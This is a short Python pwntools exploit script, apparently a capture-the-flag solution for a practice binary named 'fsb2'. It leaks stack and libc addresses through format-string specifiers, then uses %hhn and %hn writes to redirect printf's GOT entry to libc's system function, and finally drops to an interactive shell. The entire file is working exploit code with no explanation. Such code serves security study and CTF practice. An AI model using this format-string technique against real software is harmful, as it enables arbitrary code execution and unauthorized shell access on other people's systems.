#coding=utf-8
__author__="rocky"
 
from pwn import *
p=process('./fsb2')
libc=ELF('/lib/x86_64-linux-gnu/libc-2.19.so')
elf=ELF('./fsb2')

p.sendline('|%13$p|%15$p|')
data=p.recvuntil('\n').split('|')
fsb_a=int(data[1],16)-0x9f1
libc.address=int(data[2],16)-0x21ec5

p.sendline('|%17$p|%43$p|')
data=p.recvuntil('\n').split('|')
data1=int(data[1],16)
data2=int(data[2],16)
data2=data2-(data2-data1)%8
ld=data2&0xff
n=(data2-data1)/8+43
printf_got=fsb_a+elf.got['printf']

def wd(address,ld):
    for ff in range(8):
        t=(address>>(8*ff))&0xff
        # print hex(a),hex(t)
        if ld+ff==0:
        	payload1=r'%17$hhn'
        else:
        	payload1=r'%'+str(ld+ff)+r'c%17$hhn'
        if t==0:
        	payload2=r'%43$hhn'
        else:
        	payload2=r'%'+str(t)+r'c%43$hhn'
        p.sendline(payload1)
        p.recv()
        p.sendline(payload2)
        p.recv()

wd(printf_got, ld)
wd(printf_got+0x2, ld+8)

system_a=libc.symbols['system']
sys_l=system_a&0xffff
sys_h=(system_a>>16)&0xffff

if sys_l>sys_h:
	payload3=r'%'+str(sys_h)+r'c%'+str(n+1)+r'$hn%'+str(sys_l-sys_h)+r'c%'+str(n)+r'$hn'
else:
	payload3=r'%'+str(sys_l)+r'c%'+str(n)+r'$hn%'+str(sys_h-sys_l)+r'c%'+str(n+1)+r'$hn'
p.sendline(payload3)
p.recv()
p.interactive()